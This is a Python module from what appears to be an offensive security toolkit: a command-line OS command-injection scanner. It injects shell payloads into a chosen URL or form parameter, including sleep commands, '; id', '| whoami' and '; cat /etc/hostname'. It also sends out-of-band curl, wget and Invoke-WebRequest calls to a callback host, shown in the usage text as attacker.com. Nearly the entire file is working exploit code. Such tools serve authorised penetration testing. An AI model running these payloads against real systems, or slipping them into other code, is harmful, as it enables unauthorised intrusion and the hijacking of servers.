#!/usr/bin/env python3
"""
redshift_toolkit.web.cmd_injection — OS command injection oracle.

Detection
---------
1. Time-based (most reliable): inject a sleep payload, time the response,
   compare against baseline. Tests Linux, Windows cmd.exe, and PowerShell.
2. Output-based: inject `id` (linux) / `whoami` (windows) and look for the
   user prefix in the response.
3. Out-of-band: inject a curl/Invoke-WebRequest to a callback URL (operator
   monitors the callback).

Usage
-----
  python3 -m redshift_toolkit.web.cmd_injection \\
      --url 'https://app.example.com/ping?host=8.8.8.8' --param host
  python3 -m redshift_toolkit.web.cmd_injection \\
      --url https://app.example.com/api/run --data 'cmd=ls' --param cmd \\
      --callback http://attacker.com/oob/UUID

Author: Redshift Project — Module 14
License: MIT
"""

from __future__ import annotations

import argparse
import json
import sys
import time
from dataclasses import dataclass, asdict, field
from urllib.parse import urlsplit, parse_qsl, urlencode, urlunsplit

from redshift_toolkit.web.http_client import HttpRequest, send

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BOLD = "\033[1m"
RESET = "\033[0m"


def paint(s: str, c: str, on: bool) -> str:
    return f"{c}{s}{RESET}" if on else s


# Time payloads. {s} is the sleep duration in seconds.
TIME_PAYLOADS = {
    "linux ;": "; sleep {s}",
    "linux &&": "&& sleep {s}",
    "linux |": "| sleep {s}",
    "linux $()": "$(sleep {s})",
    "linux backtick": "`sleep {s}`",
    "linux %0a": "%0Asleep%20{s}",  # newline injection
    "windows &": "& timeout /t {s}",
    "windows |": "| timeout /t {s}",
    "powershell": "; Start-Sleep -Seconds {s}",
    "powershell pipe": "| Start-Sleep -Seconds {s}",
}

# Output payloads — markers per OS in the response.
OUTPUT_PAYLOADS = [
    ("; id", ["uid=", "gid="]),
    ("&& id", ["uid=", "gid="]),
    ("$(id)", ["uid=", "gid="]),
    ("| whoami", ["\\", "Administrator", "SYSTEM"]),
    ("& whoami", ["\\", "Administrator", "SYSTEM"]),
    ("; cat /etc/hostname", []),    # marker is host-specific; show body diff
    ("; uname -a", ["Linux ", "Darwin "]),
    ("| ver", ["Microsoft Windows", "[Version"]),
]


@dataclass
class CmdFinding:
    label: str
    payload: str
    technique: str   # "time" or "output" or "oob"
    elapsed_ms: float = 0.0
    body_len: int = 0
    indicator: str | None = None
    confidence: str = "low"


def _replace_param(url: str, body: str | None, name: str, value: str) -> tuple[str, str | None]:
    if body is None:
        sp = urlsplit(url)
        qs = parse_qsl(sp.query, keep_blank_values=True)
        new = []
        seen = False
        for k, v in qs:
            if k == name and not seen:
                new.append((k, value))
                seen = True
            else:
                new.append((k, v))
        if not seen:
            new.append((name, value))
        return urlunsplit((sp.scheme, sp.netloc, sp.path,
                           urlencode(new, safe="/.%:?&|()"),
                           sp.fragment)), None
    parts = parse_qsl(body, keep_blank_values=True)
    new = []
    seen = False
    for k, v in parts:
        if k == name and not seen:
            new.append((k, value))
            seen = True
        else:
            new.append((k, v))
    if not seen:
        new.append((name, value))
    return url, urlencode(new, safe="/.%:?&|()")


def _send(url: str, body: str | None, *, method: str,
          headers: list[tuple[str, str]],
          tls_verify: bool, timeout: float) -> tuple[int, bytes, float]:
    h = list(headers)
    if body and not any(k.lower() == "content-type" for k, _ in h):
        h.append(("Content-Type", "application/x-www-form-urlencoded"))
    t0 = time.time()
    r = send(HttpRequest(method=method, url=url, headers=h, body=body),
             timeout=timeout, tls_verify=tls_verify, follow_redirects=False)
    return r.status, r.body, (time.time() - t0) * 1000


def probe(url: str, param: str, *, body: str | None = None,
          method: str = "GET", original_value: str | None = None,
          headers: list[tuple[str, str]] | None = None,
          sleep_s: int = 5, callback: str | None = None,
          tls_verify: bool = True, timeout: float = 30.0) -> list[CmdFinding]:
    headers = list(headers or [])

    # Determine original value if not given
    if original_value is None:
        if body is None:
            sp = urlsplit(url)
            qs = dict(parse_qsl(sp.query, keep_blank_values=True))
            original_value = qs.get(param, "1")
        else:
            bd = dict(parse_qsl(body, keep_blank_values=True))
            original_value = bd.get(param, "1")

    findings: list[CmdFinding] = []

    # Baseline
    base_url, base_body = _replace_param(url, body, param, original_value)
    s0, body0, t0 = _send(base_url, base_body, method=method, headers=headers,
                          tls_verify=tls_verify, timeout=timeout)
    base_ms = t0
    base_len = len(body0)

    # Time-based tests
    for label, tmpl in TIME_PAYLOADS.items():
        payload = tmpl.format(s=sleep_s)
        full = original_value + payload
        u, b = _replace_param(url, body, param, full)
        try:
            s_, body_, ms = _send(u, b, method=method, headers=headers,
                                  tls_verify=tls_verify,
                                  timeout=max(timeout, sleep_s + 5))
        except Exception:
            continue
        delay = ms - base_ms
        if delay >= sleep_s * 1000 * 0.7:
            findings.append(CmdFinding(label=label, payload=payload,
                                       technique="time",
                                       elapsed_ms=ms, body_len=len(body_),
                                       indicator=f"delayed {delay/1000:.1f}s",
                                       confidence="high"))
            # No need to test others of same OS family — but keep for evidence
            break

    # Output-based tests
    for payload, markers in OUTPUT_PAYLOADS:
        full = original_value + payload
        u, b = _replace_param(url, body, param, full)
        try:
            s_, body_, ms = _send(u, b, method=method, headers=headers,
                                  tls_verify=tls_verify, timeout=timeout)
        except Exception:
            continue
        text = body_.decode("latin-1", errors="replace")
        hit = next((m for m in markers if m in text), None)
        if hit:
            findings.append(CmdFinding(label=f"output {payload!r}",
                                       payload=payload, technique="output",
                                       elapsed_ms=ms, body_len=len(body_),
                                       indicator=hit, confidence="high"))

    # OOB callback
    if callback:
        for tmpl, label in [("; curl {cb}", "linux curl OOB"),
                            ("| nslookup {cb}", "windows nslookup OOB"),
                            ("; wget -q -O- {cb}", "linux wget OOB"),
                            ("; Invoke-WebRequest {cb}", "powershell OOB")]:
            payload = tmpl.format(cb=callback)
            full = original_value + payload
            u, b = _replace_param(url, body, param, full)
            try:
                _send(u, b, method=method, headers=headers,
                      tls_verify=tls_verify, timeout=timeout)
            except Exception:
                continue
            findings.append(CmdFinding(label=label, payload=payload,
                                       technique="oob",
                                       indicator="callback fired (verify your collaborator)",
                                       confidence="medium"))

    return findings


def render_text(findings: list[CmdFinding], color: bool) -> str:
    out = [paint("\n=== Command injection probe ===", BOLD, color)]
    if not findings:
        out.append(paint("  no command-injection signals detected.", GREEN, color))
        return "\n".join(out)
    for f in findings:
        sev = paint(f.confidence,
                    RED if f.confidence == "high" else YELLOW, color)
        out.append(f"  [{sev}] {f.technique:<6} {f.label:<22} {f.payload}")
        if f.indicator:
            out.append(f"          {f.indicator}")
    return "\n".join(out)


def main() -> int:
    ap = argparse.ArgumentParser(description="OS command injection oracle.")
    ap.add_argument("--url", required=True)
    ap.add_argument("--param", required=True)
    ap.add_argument("--data", help="POST body, x-www-form-urlencoded")
    ap.add_argument("-X", "--method", default=None)
    ap.add_argument("-H", "--header", action="append", default=[])
    ap.add_argument("--sleep", type=int, default=5)
    ap.add_argument("--callback", help="OOB callback URL (you must monitor it)")
    ap.add_argument("--insecure", action="store_true")
    ap.add_argument("--timeout", type=float, default=30.0)
    ap.add_argument("--json", action="store_true")
    ap.add_argument("--no-color", action="store_true")
    args = ap.parse_args()
    color = sys.stdout.isatty() and not args.no_color and not args.json

    method = args.method or ("POST" if args.data else "GET")
    headers = []
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            headers.append((k.strip(), v.strip()))

    findings = probe(args.url, args.param, body=args.data, method=method,
                     headers=headers, sleep_s=args.sleep,
                     callback=args.callback,
                     tls_verify=not args.insecure, timeout=args.timeout)

    if args.json:
        print(json.dumps([asdict(f) for f in findings], indent=2))
    else:
        print(render_text(findings, color))

    return 0 if not findings else 1


if __name__ == "__main__":
    sys.exit(main())
